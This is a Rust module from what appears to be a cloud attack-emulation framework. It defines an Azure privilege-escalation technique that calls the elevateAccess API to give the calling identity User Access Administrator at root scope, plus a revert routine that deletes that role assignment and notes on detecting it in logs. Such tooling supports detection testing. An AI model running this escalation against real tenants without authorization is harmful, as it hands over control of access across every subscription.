use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

// No Terraform prereq — requires an existing Azure subscription with a privileged identity
const TERRAFORM: &str = r#"
# No infrastructure required for this technique.
# The executing identity must have Global Administrator in Entra ID to elevate at root scope.
"#;

async fn azure_token(tenant_id: &str, client_id: &str, client_secret: &str) -> Result<String> {
    let token_url = format!(
        "https://login.microsoftonline.com/{}/oauth2/v2.0/token",
        tenant_id
    );
    let http = reqwest::Client::new();
    let params = [
        ("client_id", client_id),
        ("client_secret", client_secret),
        ("scope", "https://management.azure.com/.default"),
        ("grant_type", "client_credentials"),
    ];
    let resp: serde_json::Value = http
        .post(&token_url)
        .form(&params)
        .send()
        .await?
        .json()
        .await?;
    resp["access_token"]
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("No access_token in response"))
        .map(str::to_string)
}

async fn detonate_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let tenant_id = std::env::var("AZURE_TENANT_ID")
        .map_err(|_| anyhow::anyhow!("AZURE_TENANT_ID env var not set"))?;
    let client_id = std::env::var("AZURE_CLIENT_ID")
        .map_err(|_| anyhow::anyhow!("AZURE_CLIENT_ID env var not set"))?;
    let client_secret = std::env::var("AZURE_CLIENT_SECRET")
        .map_err(|_| anyhow::anyhow!("AZURE_CLIENT_SECRET env var not set"))?;

    let token = azure_token(&tenant_id, &client_id, &client_secret).await?;
    let http = reqwest::Client::new();

    // POST /providers/Microsoft.Authorization/elevateAccess at tenant root
    let url =
        "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01";

    let resp = http
        .post(url)
        .bearer_auth(&token)
        .header("Content-Length", "0")
        .send()
        .await?;

    if resp.status().is_success() || resp.status().as_u16() == 200 || resp.status().as_u16() == 204 {
        println!(
            "Elevated access to User Access Administrator at root scope '/' — \
             identity can now manage all RBAC assignments across all subscriptions"
        );
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!(
            "Failed to elevate access ({}): {}. \
             Note: the executing identity must be a Global Administrator in Entra ID.",
            status,
            text
        );
    }

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let tenant_id = std::env::var("AZURE_TENANT_ID")
        .map_err(|_| anyhow::anyhow!("AZURE_TENANT_ID env var not set"))?;
    let client_id = std::env::var("AZURE_CLIENT_ID")
        .map_err(|_| anyhow::anyhow!("AZURE_CLIENT_ID env var not set"))?;
    let client_secret = std::env::var("AZURE_CLIENT_SECRET")
        .map_err(|_| anyhow::anyhow!("AZURE_CLIENT_SECRET env var not set"))?;

    let token = azure_token(&tenant_id, &client_id, &client_secret).await?;
    let http = reqwest::Client::new();

    // List role assignments at root scope to find the User Access Administrator assignment
    let list_url = "https://management.azure.com/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()";
    let assignments: serde_json::Value = http
        .get(list_url)
        .bearer_auth(&token)
        .send()
        .await?
        .json()
        .await?;

    // User Access Administrator role definition ID
    let uaa_role_id = "18d7d88d-d35e-4fb5-a5c3-7773c20a72d9";

    let items = assignments["value"]
        .as_array()
        .ok_or_else(|| anyhow::anyhow!("Unexpected response format for role assignments"))?;

    let mut removed = 0usize;
    for item in items {
        let role_def = item["properties"]["roleDefinitionId"]
            .as_str()
            .unwrap_or("");
        if role_def.ends_with(uaa_role_id) {
            let assignment_id = item["id"].as_str().unwrap_or("");
            if assignment_id.is_empty() {
                continue;
            }
            let del_url = format!(
                "https://management.azure.com{}?api-version=2022-04-01",
                assignment_id
            );
            let del_resp = http.delete(&del_url).bearer_auth(&token).send().await?;
            if del_resp.status().is_success() || del_resp.status().as_u16() == 204 {
                println!("Removed User Access Administrator role assignment at root scope: {}", assignment_id);
                removed += 1;
            }
        }
    }

    if removed == 0 {
        println!("No User Access Administrator role assignments found at root scope — nothing to remove");
    }

    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "azure.privilege-escalation.root-user-access-administrator",
        friendly_name: "Elevate to User Access Administrator at Azure Root Scope",
        description: "Uses the elevateAccess API to grant the calling identity User Access Administrator at the root management scope, enabling full RBAC control across all subscriptions.",
        detection: "Azure Activity Log: Microsoft.Authorization/elevateAccess/action. Entra ID audit log: elevated access grant. Unusual role assignment at root scope.",
        platform: Platform::Azure,
        mitre_tactics: &[MitreTactic::PrivilegeEscalation],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: None,
        detonate,
        revert: Some(revert),
    }
}
